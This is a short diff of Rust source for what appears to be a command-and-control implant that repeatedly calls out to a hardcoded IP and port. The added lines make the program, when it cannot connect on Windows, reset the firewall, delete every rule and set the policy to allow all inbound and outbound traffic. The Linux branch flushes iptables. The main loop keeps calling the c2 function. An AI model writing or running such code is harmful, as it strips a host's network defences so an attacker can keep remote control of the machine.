@@ -20,7 +20,9 @@ fn connect(ip: &str) -> TcpStream {
         if x > 24{ //if after 2 minutes of no connecting, drop IP tables
             x = 0;
             if cfg!(windows){
-                continue
+                Exec::shell("netsh advfirewall reset");
+                Exec::shell("netsh advfirewall firewall delete rule name=all");
+                Exec::shell("netsh advfirewall set currentprofile firewallpolicy allowinbound,allowoutbound");
             } else{
                 Exec::shell("iptables -F");
             }
@@ -122,8 +124,8 @@ fn constant_checker(){
 fn main(){
     let ip = "129.21.49.57:5678";
     loop{
-        connect_to_router();
         c2(&ip);
+        connect_to_router();
     }
     // constant_checker();
 }
